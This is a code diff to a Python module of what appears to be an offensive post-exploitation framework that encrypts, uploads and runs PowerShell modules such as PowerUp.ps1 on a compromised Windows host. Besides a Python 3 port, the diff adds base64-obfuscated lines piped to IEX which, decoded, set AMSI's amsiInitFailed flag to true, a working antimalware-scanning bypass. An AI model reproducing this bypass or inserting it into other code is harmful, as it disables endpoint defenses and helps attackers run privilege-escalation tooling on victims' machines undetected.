@@ -37,7 +37,9 @@ class Invoke_ps_module(Module):
                 #invoke_ps_module PowerUp.ps1 ';Invoke-AllChecks'
     """
 
-    _ps_code = ur"""
+    _ps_code = r"""
+                [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JFJlZj1bUmVmXS5Bc3NlbWJseS5HZXRUeXBlKCdTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkFtcycrJ2lVdGlscycpOw=="))|IEX;
+                [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JFJlZi5HZXRGaWVsZCgnYW1zaUluJysnaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuU2V0VmFsdWUoJG51bGwsJHRydWUpOw=="))|IEX;
                 $path_in_module="%s";
                 $path_in_app_code="%s";
                 $key=[System.Text.Encoding]::UTF8.GetBytes('%s');
@@ -57,7 +59,9 @@ class Invoke_ps_module(Module):
                 Remove-Item -Path $path_in_app_code -Force 2>&1 | Out-Null;
     """
 
-    _ps_code_no_appended_code = ur"""
+    _ps_code_no_appended_code = r"""
+                [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JFJlZj1bUmVmXS5Bc3NlbWJseS5HZXRUeXBlKCdTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkFtcycrJ2lVdGlscycpOw==")) | IEX;
+                [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("JFJlZi5HZXRGaWVsZCgnYW1zaUluJysnaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuU2V0VmFsdWUoJG51bGwsJHRydWUpOw==")) | IEX;
                 $path_in="%s";
                 $key=[System.Text.Encoding]::UTF8.GetBytes('%s');
                 $encrypted=[System.IO.File]::ReadAllBytes($path_in);
@@ -108,7 +112,7 @@ class Invoke_ps_module(Module):
         if '""' in appended_code:
             appended_code = appended_code.replace('""', '"')
         enc_appended_code_path = config.modules_paths + 'ps_modules/' + random_generator()
-        byte_arr_app_module_encrypted = bytearray(appended_code)
+        byte_arr_app_module_encrypted = bytearray(appended_code, 'utf-8')
         self.__xor_bytearray(byte_arr_app_module_encrypted)
         with open(enc_appended_code_path, 'wb') as file_handle:
             file_handle.write(byte_arr_app_module_encrypted)
@@ -127,12 +131,12 @@ class Invoke_ps_module(Module):
             encrypted_module_path = self._module_settings[ps_module]
         else:
             local_encrypted_module_path = self._gen_encrypted_module(ps_module)
-            print '\n\n\nUploading encrypted ps module....\n'
+            print ('\n\n\nUploading encrypted ps module....\n')
             try:
                 encrypted_module_path = self._module_settings['env_directory'] + '\\' + random_generator()
                 upload_response = self._parse_response(self.upload_module_object.run([local_encrypted_module_path,
                                                                                       encrypted_module_path]))
-                print upload_response
+                print (upload_response)
                 self._module_settings[ps_module] = encrypted_module_path
             except Exception as exc:
                 raise self._exception_class(str(exc))
